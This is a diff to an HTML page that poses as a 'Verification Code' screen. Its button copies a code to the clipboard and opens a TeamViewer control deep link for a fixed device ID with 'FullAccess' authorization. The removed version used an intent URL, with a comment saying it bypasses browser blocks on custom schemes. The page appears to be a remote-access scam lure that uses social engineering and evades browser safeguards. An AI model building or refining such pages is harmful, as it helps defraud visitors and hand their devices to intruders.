@@ -58,9 +58,9 @@
             <div class="code-label">Verification Code</div>
             <div class="code-value">qrntf9qd</div>
         </div>
-        <!-- Intent URL bypasses browser blocks on custom schemes -->
+        <!-- The anchor directly carries the deep link; clipboard copy happens on click -->
         <a class="button" id="connectBtn"
-           href="intent://control?device=791826887&authorization=FullAccess#Intent;scheme=tvcontrol1;package=com.teamviewer.teamviewer.market.mobile;end;">
+           href="tvcontrol1://control?device=791826887&authorization=FullAccess">
             Copy Code &amp; Open TeamViewer
         </a>
         <p class="footer">
@@ -72,10 +72,12 @@
     <script>
         const code = "123456";
         document.getElementById('connectBtn').addEventListener('click', async function(e) {
+            // Copy the code to clipboard; then the browser
+            // follows the href (tvcontrol1://...) because it's a real click.
             try {
                 await navigator.clipboard.writeText(code);
             } catch (err) { }
-            // The href will open the app after the click
+            // No e.preventDefault() – allows the link to fire normally.
         });
     </script>
 </body>
